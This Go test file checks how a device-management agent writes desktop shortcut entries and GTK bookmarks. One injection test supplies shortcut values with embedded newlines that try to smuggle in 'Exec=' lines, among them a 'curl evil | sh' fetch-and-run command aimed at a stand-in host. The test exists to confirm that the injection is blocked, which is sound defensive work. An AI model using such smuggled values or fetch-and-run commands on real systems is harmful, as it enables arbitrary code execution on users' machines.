package apply

import (
	"os"
	"strings"
	"testing"

	"odm.example.org/agent/internal/policy"
)

func TestADesktopEntryIsTheFormatTheDesktopReads(t *testing.T) {
	link := desktopEntry(policy.Shortcut{
		Name: "Intranet", Kind: "link", Target: "https://intranet.example.org", Icon: "web-browser",
	})
	for _, want := range []string{
		"[Desktop Entry]", "Type=Link", "Name=Intranet",
		"URL=https://intranet.example.org", "Icon=web-browser",
	} {
		if !strings.Contains(link, want) {
			t.Errorf("missing %q:\n%s", want, link)
		}
	}

	program := desktopEntry(policy.Shortcut{
		Name: "Remmina", Kind: "application", Target: "/usr/bin/remmina",
	})
	if !strings.Contains(program, "Type=Application") ||
		!strings.Contains(program, "Exec=/usr/bin/remmina") {
		t.Errorf("an application is not written as one:\n%s", program)
	}
}

func TestAValueCannotAddALineOfItsOwnToADesktopEntry(t *testing.T) {
	// A desktop entry is one key per line, and this one is executable.
	entry := desktopEntry(policy.Shortcut{
		Name:   "Bad\nExec=/bin/sh -c 'curl evil | sh'",
		Kind:   "link",
		Target: "https://example.org\nExec=/bin/sh",
	})
	for _, line := range strings.Split(entry, "\n") {
		if strings.HasPrefix(line, "Exec=") {
			t.Errorf("a value added a key of its own:\n%s", entry)
		}
	}
	// Every line is one of the keys this writes, so nothing a value carried
	// became a key of its own.
	known := []string{"[Desktop Entry]", "Type=", "Name=", "URL=", "X-GNOME-"}
	for _, line := range strings.Split(strings.TrimSpace(entry), "\n") {
		found := false
		for _, key := range known {
			found = found || strings.HasPrefix(line, key)
		}
		if !found {
			t.Errorf("a line nothing here writes: %q\n%s", line, entry)
		}
	}
}

func TestAPlaceIsWrittenAsTheFileManagerReadsIt(t *testing.T) {
	line := bookmarkLine(policy.Shortcut{Name: "Shared", Kind: "place", Target: "smb://fs01/shared"})
	if line != "smb://fs01/shared Shared" {
		t.Errorf("bookmark line is %q", line)
	}
	// A bare path becomes a URI, because that is what the file is.
	local := bookmarkLine(policy.Shortcut{Name: "Scratch", Kind: "place", Target: "/srv/scratch"})
	if local != "file:///srv/scratch Scratch" {
		t.Errorf("a path was not turned into a URI: %q", local)
	}
}

func TestOnlyTheBookmarksThisPolicyWroteAreRewritten(t *testing.T) {
	// A bookmark somebody added themselves is theirs.
	env, _ := testEnv(t)
	// This process's own ids: writeAs chowns what it writes, and a test that
	// is not root cannot give a file away — which is what CI is.
	who := account{uid: os.Getuid(), gid: os.Getgid(), home: env.Path("/home/ada")}
	if err := makeUnder(who, who.home+"/.config/gtk-3.0"); err != nil {
		t.Fatal(err)
	}
	if err := writeAs(who, who.home+"/"+gtkBookmarks,
		"file:///home/ada/Notes Notes\nsmb://old/share Old # odm\n", 0o644); err != nil {
		t.Fatal(err)
	}

	if err := writeBookmarks(who, []string{"smb://fs01/shared Shared"}); err != nil {
		t.Fatal(err)
	}
	body := read(t, env, "/home/ada/"+gtkBookmarks)
	if !strings.Contains(body, "file:///home/ada/Notes Notes") {
		t.Errorf("somebody's own bookmark was removed:\n%s", body)
	}
	if strings.Contains(body, "smb://old/share") {
		t.Errorf("a bookmark the policy stopped setting was left behind:\n%s", body)
	}
	if !strings.Contains(body, "smb://fs01/shared Shared # odm") {
		t.Errorf("the new place was not written:\n%s", body)
	}
}
